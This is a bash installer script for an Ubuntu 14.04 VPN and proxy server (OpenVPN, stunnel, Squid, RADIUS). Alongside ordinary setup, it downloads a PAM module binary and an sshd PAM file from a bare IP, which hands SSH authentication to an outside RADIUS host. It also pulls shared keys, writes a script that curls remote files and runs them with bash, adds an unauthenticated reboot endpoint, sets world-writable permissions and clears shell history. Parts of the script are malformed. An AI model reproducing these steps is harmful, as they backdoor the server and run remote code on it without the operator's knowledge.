r
echo -e "\e[1;32m-----------------------------------------------------"
echo -e "\e[1;32m    Ubuntu 14.04 x64 Bit Installer by Bidek Franz    "
echo -e "\e[1;32m-----------------------------------------------------"
sleep 2
clear
echo -----------------------------------------------------
echo Updating System Files
echo -----------------------------------------------------
sleep 2
apt-get update
apt-get install sudo -y
apt-get -y upgrade 
apt-get install sysv-rc-conf -y
cp /usr/sbin/sysv-rc-conf /usr/sbin/chkconfig
apt-get install mysql-client nano fail2ban unzip apache2 squid3 build-essential curl dnsmasq -y
sudo cp /etc/squid3/squid.conf /etc/squid3/squid.conf.orig
apt-get install php5 -y
apt-get install php-common -y
apt-get install xtables-addons-common -y
apt-get install module-assistant -y
module-assistant auto-install xtables-addons-source
depmod -a
clear
echo -----------------------------------------------------
echo Installing Openvpn
echo -----------------------------------------------------
sleep 2
apt-get install openvpn easy-rsa -y
mkdir -p /etc/openvpn/easy-rsa/keys
mkdir -p /etc/openvpn/login
mkdir -p /var/www/html/status
clear
echo -----------------------------------------------------
echo Configuring Sysctl
echo -----------------------------------------------------
sleep 2
sysctl -w net.ipv4.ip_forward=1
echo 'net.ipv4.ip_forward=1
net.ipv4.icmp_echo_ignore_all = 1' >> /etc/sysctl.conf
clear 
echo -----------------------------------------------------
echo Disabled Selinux!
echo -----------------------------------------------------
sleep 2
SELINUX=disabled 
clear
echo -----------------------------------------------------
echo Installing Stunnel
echo -----------------------------------------------------
sleep 2
apt-get install stunnel4 -y
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
clear
echo -----------------------------------------------------
echo Configuring Stunnel.conf 
echo -----------------------------------------------------
wget http://vps-setup.000webhostapp.com/forge.pem
cat /root/forge.pem > /etc/stunnel/stunnel.pem
touch /var/www/html/status/stunnel.txt
touch /var/www/html/status/tcp1.txt
touch /var/www/html/status/ipp.txt
sleep 1
rm forge.pem
sleep 1
echo 'cert=/etc/stunnel/stunnel.pem
socket = a:SO_REUSEADDR=1
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1
client = no

[ssh]
connect = xxx.xxx.xxx.xxx:22
accept = 443'

[openvpn]
connect = xxx.xxx.xxx.xxx:1194
accept = 4433 > /etc/stunnel/stunnel.conf
clear
echo -----------------------------------------------------
echo Configuring Radius Authentication
echo -----------------------------------------------------
sleep 2
mkdir /etc/raddb/
echo "68.183.88.210:1812 Cloud2017 3" > /etc/raddb/server
cd /lib/x86_64-linux-gnu/security/
wget http://216.250.97.21/ads/pam_radius_auth.so
chmod 755 pam_radius_auth.so
rm /etc/pam.d/sshd
sleep 1
cd /etc/pam.d/
wget http://216.250.97.21/sshd
sleep 1
chmod 644 /etc/pam.d/sshd
cd /root
clear
echo -----------------------------------------------------
echo Checking Configuration
echo -----------------------------------------------------
sleep 2
chkconfig apache2 on
chkconfig squid3 on
chkconfig cron on
chkconfig openvpn on
chkconfig stunnel4 on
chkconfig fail2ban on
clear
echo -----------------------------------------------------
echo Configuring IP Tables with Anti Torrent
echo -----------------------------------------------------
sleep 2
sysctl -p
iptables -F; iptables -X; iptables -Z
iptables -t nat -A POSTROUTING -s 172.20.0.0/24 -j SNAT --to `curl icanhazip.com`
iptables -A INPUT -i tun0 -j ACCEPT
iptables -A FORWARD -i tun0 -j ACCEPT
iptables -t mangle -A PREROUTING -j CONNMARK --restore-mark
iptables -t mangle -A PREROUTING -m mark ! --mark 0 -j ACCEPT
iptables -t mangle -A PREROUTING -m ipp2p --bit -j MARK --set-mark 1
iptables -t mangle -A PREROUTING -m ipp2p --edk -j MARK --set-mark 1
iptables -t mangle -A PREROUTING -m mark --mark 1 -j CONNMARK --save-mark
iptables -A FORWARD -m mark --mark 1 -j REJECT
iptables -A INPUT -m mark --mark 1 -j REJECT
iptables -A OUTPUT -m mark --mark 1 -j REJECT
clear
echo -----------------------------------------------------
echo Configuring Server and Squid conf
echo -----------------------------------------------------
sleep 2
touch /etc/openvpn/server.conf
sleep 1
echo 'http_port 8080
http_port 3128
http_port 8888
http_port 9999
http_port 7777
http_port 6666
http_port 5555
http_port 4444
http_port 3333
http_port 2222
http_port 1111
acl to_vpn dst xxx.xxx.xxx.xxx
http_access allow to_vpn 
via off
forwarded_for off
request_header_access Allow allow all
request_header_access Authorization allow all
request_header_access WWW-Authenticate allow all
request_header_access Proxy-Authorization allow all
request_header_access Proxy-Authenticate allow all
request_header_access Cache-Control allow all
request_header_access Content-Encoding allow all
request_header_access Content-Length allow all
request_header_access Content-Type allow all
request_header_access Date allow all
request_header_access Expires allow all
request_header_access Host allow all
request_header_access If-Modified-Since allow all
request_header_access Last-Modified allow all
request_header_access Location allow all
request_header_access Pragma allow all
request_header_access Accept allow all
request_header_access Accept-Charset allow all
request_header_access Accept-Encoding allow all
request_header_access Accept-Language allow all
request_header_access Content-Language allow all
request_header_access Mime-Version allow all
request_header_access Retry-After allow all
request_header_access Title allow all
request_header_access Connection allow all
request_header_access Proxy-Connection allow all
request_header_access User-Agent allow all
request_header_access Cookie allow all
request_header_access All deny all 
http_access deny all' > /etc/squid3/squid.conf
sleep 2
echo 'local xxx.xxx.xxx.xxx
mode server 
tls-server 
port 1194 
proto tcp 
dev tun 
tun-mtu 1500
tun-mtu-extra 32 
mssfix 1450
tcp-queue-limit 128
txqueuelen 2000
tcp-nodelay
sndbuf 393216
rcvbuf 393216
push "sndbuf 393216"
push "rcvbuf 393216"
connect-retry-max infinite
max-clients 60
ca /etc/openvpn/easy-rsa/keys/ca.crt 
cert /etc/openvpn/easy-rsa/keys/server.crt 
key /etc/openvpn/easy-rsa/keys/server.key 
dh /etc/openvpn/easy-rsa/keys/dh4096.pem 
script-security 2 
client-cert-not-required 
username-as-common-name 
auth-user-pass-verify "/etc/openvpn/login/auth_vpn" via-file # 
tmp-dir "/etc/openvpn/" # 
server 172.20.0.0 255.255.255.0
push "redirect-gateway def1" 
push "dhcp-option DNS 172.20.0.1"
push "dhcp-option DNS 8.8.8.8"
push "block-outside-dns"
keepalive 5 30
comp-lzo
persist-key 
persist-tun
verb 3
mute 20
cipher AES-256-CBC
up /etc/openvpn/update-resolv-conf                                                                                      
down /etc/openvpn/update-resolv-conf
status /var/www/html/status/tcp1.txt
ifconfig-pool-persist /var/www/html/status/ipp.txt' > /etc/openvpn/server.conf
sleep 1
cd /etc/openvpn/
chmod 755 server.conf
sleep 1
wget http://vps-setup.000webhostapp.com/fpre.zip
unzip fpre.zip
rm fpre.zip
cd /etc/openvpn/login/
sleep 1
chmod 755 auth_vpn
sleep 1
cd /etc/openvpn/easy-rsa/keys
wget http://vps-setup.000webhostapp.com/fkeys.zip
unzip fkeys.zip
rm fkeys.zip
sleep 1
sed -i 's/xxx.xxx.xxx.xxx/'`curl icanhazip.com`'/g' /etc/openvpn/server.conf
sed -i 's/xxx.xxx.xxx.xxx/'`curl icanhazip.com`'/g' /etc/squid3/squid.conf
sed -i 's/xxx.xxx.xxx.xxx/'`curl icanhazip.com`'/g' /etc/stunnel/stunnel.conf
sleep 1 
clear
echo -----------------------------------------------------
echo Configuring Block Ads
echo -----------------------------------------------------
sleep 1
echo 'domain-needed
bogus-priv
server=8.8.8.8
server=8.8.4.4
listen-address=127.0.0.1
listen-address=172.20.0.1' > /etc/dnsmasq.conf
sleep 1
wget http://216.250.97.21/ads/xFranz.list -O /etc/hosts
sleep 1
clear
echo -----------------------------------------------------
echo Creating Auto Updates Script
echo -----------------------------------------------------
sleep 2
touch /usr/local/sbin/xFranz.sh
chmod 777 /usr/local/sbin/xFranz.sh
echo 'wget http://216.250.97.21/ads/xFranz.list -O /etc/hosts
service dnsmasq restart
service openvpn restart
service stunnel4 restart' > /usr/local/sbin/xFranz.sh
clear
echo -----------------------------------------------------
echo Adding Radius Cron file
echo -----------------------------------------------------
sleep 2
echo 'rm -rf /root/premium1.txt
rm -rf /root/premium2.txt
curl http://ssh.sfnet.ltd/list/forge/premium1.txt >> /root/premium1.txt
curl http://ssh.sfnet.ltd/list/forge/premium2.txt >> /root/premium2.txt
bash premium1.txt
bash premium2.txt' > /root/forgessh.sh
sleep 1
cd /root
sleep 1
groupadd forgessh
chmod +x forgessh.sh
sleep 2
clear
echo -----------------------------------------------------
echo Creating Auto Reboot Files
echo -----------------------------------------------------
sleep 2
touch /usr/local/sbin/checkreboot.sh
chmod 777 /usr/local/sbin/checkreboot.sh
echo '#!/bin/bash
if [ -f /var/www/html/reboot.server ]; then
  rm -f /var/www/html/reboot.server
  /sbin/shutdown -r now 
fi' > /usr/local/sbin/checkreboot.sh
clear
echo -----------------------------------------------------
echo Adding PHP Code
echo -----------------------------------------------------
sleep 2
touch /var/www/html/forge-reboot.php
echo '<?php
$data = "reboot now";
$location = "/var/www/html/reboot.server";
$fp = fopen($location, 'w');
$fwrite = fwrite($fp, trim($data));
if($fwrite)
{
	fclose($fp);
	echo "Success";
}else{
	die("Failed!");
}
?>' > /var/www/html/forge-reboot.php
sleep 2
chmod 777 /var/www/html/forge-reboot.php
clear
echo -----------------------------------------------------
echo Modifying Permission
echo -----------------------------------------------------
sleep 2
sudo usermod -a -G www-data root
sudo chgrp -R www-data /var/www
sudo chmod -R g+w /var/www
clear
echo -----------------------------------------------------
echo Add Cron Settings
echo -----------------------------------------------------
sleep 2
echo '#' >> /var/spool/cron/crontabs/root
env EDITOR=nano crontab -e
sleep 1
service cron restart
clear
echo -----------------------------------------------------
echo Configuring Fail2Ban
echo -----------------------------------------------------
sleep 3
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
sed -i 's/bantime  = 600/bantime  = 3600/g' /etc/fail2ban/jail.local
sed -i 's/maxretry = 6/maxretry = 3/g' /etc/fail2ban/jail.local
clear
echo -----------------------------------------------------
echo Saving Setup Rules
echo -----------------------------------------------------
sleep 2
sudo apt-get install iptables-persistent -y
iptables-save > /etc/iptables/rules.v4 
ip6tables-save > /etc/iptables/rules.v6
sudo invoke-rc.d iptables-persistent save
clear
echo -----------------------------------------------------
echo Starting Services
echo -----------------------------------------------------
sleep 2
service openvpn start
service squid3 start
service apache2 start
service fail2ban start
service stunnel4 start
service dnsmasq restart
clear
echo -----------------------------------------------------
echo "Installation is finish! Server Reboot in 3 seconds"
echo ------------------------------------------------------
history -c
echo "Application & Port Information"
echo "   - Putty		: 22"
echo "   - SSL  		: 443"
echo "   - Openvpn		: 1194"
sleep 1
echo ""
echo ""
echo "3"
sleep 1
echo "2"
sleep 1
echo "1"
sleep 1
echo "Done"
rm /root/premium.sh
reboot 
